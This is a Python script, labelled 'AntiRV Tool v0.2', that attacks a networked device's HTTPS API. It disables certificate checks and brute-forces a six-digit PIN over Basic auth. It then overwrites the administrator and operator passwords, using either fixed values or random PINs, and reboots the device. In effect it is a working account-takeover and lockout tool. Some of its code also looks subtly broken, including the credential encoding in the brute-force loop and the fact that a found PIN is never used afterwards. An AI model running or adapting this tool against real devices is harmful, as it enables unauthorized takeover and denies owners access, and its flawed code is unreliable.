# v 0.2
import sys;
import ssl;
import json;
import base64;
import string;
import random;
import logging;
import http.client;
from datetime import datetime;

from config import *;

def get(connection:http.client.HTTPSConnection, action:str, creds:str, data:str = ''):

    status = 0; result = '';
    try:
        headers = { 'Authorization': 'Basic ' + creds };
        connection.request('GET', '/v1/' + action, data, headers,);
        response = connection.getresponse();
        status = response.status;
        result = response.read();
    except Exception as ex:
        logger.error('get(): ' + str(ex));

    return status, result;

def post(connection:http.client.HTTPSConnection, action:str, creds:str, data:str = ""):

    status = 0; result = '';
    try:
        headers = { 'Content-Type': 'application/json', 'Authorization': 'Basic ' + creds };
        connection.request('POST', '/v1/' + action, data, headers);

        response = connection.getresponse();
        status = response.status;
        result = response.read();
    except Exception as ex:
        logger.error('post(): ' + str(ex));

    return status, result;

def info(connection:http.client.HTTPSConnection, creds:str):

    status, result = get(connection, 'deviceInfo', creds);
    if not status == 200:
        logger.error('Can\'t get device info, get returned ' + str(status));
        return False;
    else:
        logger.info('Info ok: ' + rv_url + ':' + str(rv_port)); 
        return True;

def config(connection:http.client.HTTPSConnection, creds:str):

    status, result = get(connection, 'config', creds);
    if not status == 200:
        logger.error('Can\'t get device config, get returned ' + str(status));
        return False;
    else:
        logger.info('Config ok: ' + rv_url + ':' + str(rv_port)); 
        return True;

def merge(connection:http.client.HTTPSConnection, creds:str):

    passwords = json.dumps({ 'passwords': { 'administrator': get_random_pin('administrator') if rv_random else '654321' , 'operator': get_random_pin('operator') if rv_random else '123456' }});
    status, result = post(connection, 'mergeConfig', creds, passwords);
    if not status == 200 and not result == '':
        logger.error('Can\'t merge config, post returned ' + str(status));
        return False;
    else:
        logger.info('Merge ok: ' + rv_url + ':' + str(rv_port)); 
        return True;

def reboot(connection:http.client.HTTPSConnection, creds:str):

    status, result = post(connection, 'reboot', creds);
    if not status== 200 and not result == '':
        logger.error('Can\'t reboot, post returned ' + str(status));
        return False;
    else:
        logger.info('Reboot ok: ' + rv_url + ':' + str(rv_port)); 
        return True;

def start_log():

    try:
        logger = logging.getLogger();
        logger.setLevel(logging.INFO);
        formatter = logging.Formatter('%(asctime)s | %(levelname)s | %(message)s');
        stdout_handler = logging.StreamHandler(sys.stdout);
        stdout_handler.setLevel(logging.INFO);
        stdout_handler.setFormatter(formatter);
        if rv_log:
            now = datetime.now();
            logfile = rv_url.replace('https://', '').replace('http://', '') + now.strftime("_%m.%d.%Y_%H.%M.%S") + '.log';
            file_handler = logging.FileHandler(logfile);
            file_handler.setLevel(logging.INFO);
            file_handler.setFormatter(formatter);
        logger.addHandler(file_handler);
        logger.addHandler(stdout_handler);
    except Exception as ex:
        print('start_log(): ', str(ex));
        return None;

    finally:
        logger.info('AntiRV Tool v0.2');
        logger.info('Target: ' + rv_url + ':' + str(rv_port));
        if rv_log: logger.info('Logging to file');
        if rv_random: logger.info('Setting random passwords for users');
    return logger;

def get_random_pin(user: str, size = 6, chars = string.digits):

    pin = ''.join(random.choice(chars) for _ in range(size));
    logger.info('New pin for ' + user + ': ' + pin);
    return pin;

def brute(connection:http.client.HTTPSConnection):

    for x in range(999999):
        xstr = str(x).zfill(6);
        creds = str(base64.b64encode((rv_user + ':' + xstr).encode('ascii')));
        status, result = get(connection, 'deviceInfo', creds);
        if status == 200:
            logger.info('Pin found! ' + xstr);
            return xstr;
        elif status == 401: continue;
        else:
            logger.error('get() returned: ' + status);
            break;
    return '';

if __name__ == "__main__":

    ssl._create_default_https_context = ssl._create_unverified_context;
    try:
        logger = start_log();
        if logger == None: exit();

        creds = (rv_user + ':' + rv_password).encode('ascii');
        creds = base64.b64encode(creds).decode('ascii');
        connection = http.client.HTTPSConnection(rv_url, rv_port);

        if rv_brute:
            rv_password_new = brute(connection);
            if rv_password_new != '':
                logger.info('Password is not standart: ' + rv_password_new);
                rv_password = rv_password_new;

        # skip info & config?
        if not info(connection, creds) or not config(connection, creds) or not merge(connection, creds): exit();
        else: reboot(connection, creds);

    except Exception as ex:
        logger.exception('main(): ' + str(ex));
    finally:
        connection.close();
    exit();